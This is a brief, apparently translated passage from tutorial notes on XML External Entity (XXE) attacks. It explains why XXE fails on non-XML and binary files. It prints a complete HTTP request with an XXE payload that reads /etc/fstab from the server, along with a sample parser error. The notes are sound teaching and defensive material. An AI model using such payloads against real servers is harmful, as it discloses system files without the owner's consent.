## Restrictions
For the classic usage of XXE, it is usually more convenient to read the file, but it also determines that the content element that can be parsed must be an XML document.    

As an example:   
request:   
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/fstab">;
]>
<foo>
  &bar;
</foo>
```   
(usual) response:   
```
HTTP / 1.0 500 Internal Server Error

File "file: /// etc / fstab", line 3
lxml.etree.XMLSyntaxError: Specification mandate value for attribute system, line 3, column 15 ...
```   
/etc/fstabIs a file containing some characters that look like XML (even if they are not XML). This will cause the XML parser to try to parse these elements, only to notice that it is not a valid XML document.

### THEREFORE~!
this limits XML External Entities (XXE) in two important ways.   
1. XXE can only be used to get files or responses containing "valid" XML   
2. XXE cannot be used to get binary files   


## XML External Entities (XXE) Restriction Solution
